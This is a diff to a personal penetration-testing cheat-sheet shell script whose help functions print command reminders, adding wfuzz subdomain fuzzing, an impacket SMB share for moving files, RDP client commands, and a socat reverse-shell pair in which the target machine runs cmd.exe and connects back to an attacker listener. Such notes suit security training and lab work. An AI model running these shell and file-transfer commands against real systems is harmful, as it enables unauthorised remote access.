@@ -30,6 +30,7 @@ function print-figlet() {
 }
 
 
+
 # Variables for terminal requests.
 [[ -t 2 ]] && {
     alt=$(      tput smcup  || tput ti      ) # Start alt display
@@ -137,7 +138,25 @@ echo "gcc -o service /home/user/tools/suid/service.c"
 
 }
 
+function help-fuzz() {
+    help-wfuzz
+}
 
+function help-wfuzz() {
+    echo ${reset}${green}
+    echo 'wfuzz -c -f file.out -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://website.name" -H "Host: FUZZ.website.name" --hl 107'
+    echo "${yellow}"
+    echo "-c"
+    echo "-f output filename"
+    echo "-w wordlist"
+    echo "-u url"
+    echo "-H Host: FUZZ.website.name"
+    echo "         FUZZ will be fuzzed"
+    echo "-hl is the output to exclude"
+    echo "    check the man page"
+    echo "${reset}"
+
+}
 
 function help-john () {
     help-cracking
@@ -491,6 +510,10 @@ badchars = (
 
 EOF
 echo $reset
+}
+
+function help-impacket {
+echo "sudo impacket-smbserver -smb2support files `pwd` -username bob -password bob"
 }
 
 function help-nmap {
@@ -925,6 +948,9 @@ function help-socat {
     echo ""
     echo "socat - OPENSSL:$ip:$port,verify=0"
     echo " - passes STDIN to the connecting shell"
+    echo ""
+    echo "Kali Box: socat TCP4-LISTEN:443,fork STDOUT"
+    echo "socat -d -d TCP4:192.168.X.X:443 EXEC:'cmd.exe',pipes"
 }
 
 function help-powercat {
@@ -1022,4 +1048,19 @@ function help-bash {
     echo "else"
     echo "  some other action"
     echo "fi"
+}
+
+function help-rdp {
+print-figlet "Remote Desktop"
+if which tldr > /dev/null; then tldr xfreerdp;echo ; fi
+if which tldr > /dev/null; then tldr rdesktop;echo ; fi
+if which tldr > /dev/null; then tldr remmina;echo ; fi
+echo "${reset}${yellow}"
+echo "   xfreerdp /u:\$username /p:\$password /cert:ignore /v:\$ip"
+echo ""
+echo "${yellow}   rdesktop -g 70% -u \$username-p \$password \$ip "
+echo ""
+echo "${yellow}   remmina # is another program that should be installed"
+
+
 }
